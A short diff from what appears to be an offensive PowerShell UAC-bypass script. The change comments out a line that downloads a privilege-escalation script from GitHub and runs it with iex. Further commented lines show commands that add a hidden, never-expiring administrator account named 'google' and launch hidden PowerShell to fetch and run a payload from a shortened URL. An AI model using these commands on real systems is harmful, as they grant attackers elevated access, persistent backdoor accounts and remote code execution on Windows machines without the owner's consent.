@@ -1534,7 +1534,7 @@ C:\PS> Bypass-UAC -Method ucmDismMethod -CustomDll C:\Users\b33f\Desktop\cmd.dll
  	    #IEX $($env:SystemRoot + '\System32\cmd.exe') 			
 	    #IEX $('Start-Process -w hidden -FilePath ' + $env:SystemRoot + '\System32\WindowsPowerShell\v1.0\powershell.exe -C')
 	    
-	    iwr https://raw.githubusercontent.com/H0K5/PowerShell-Suite/master/UAC-TokenMagic.ps1 | iex
+	    #iwr https://raw.githubusercontent.com/H0K5/PowerShell-Suite/master/UAC-TokenMagic.ps1 | iex
 #UAC-TokenMagic -BinPath C:\Windows\System32\cmd.exe -Args "/c net user google passwd /add /y /expires:never & net localgroup Administrateurs google /add" -ProcPID (ps -Name mmc).id
 
 #UAC-TokenMagic -BinPath C:\Windows\System32\cmd.exe -Args "/c 'powershell -ep bypass -nop -C iwr https://goo.gl/xXZGMs | iex'" -ProcPID (ps -Name mmc).id
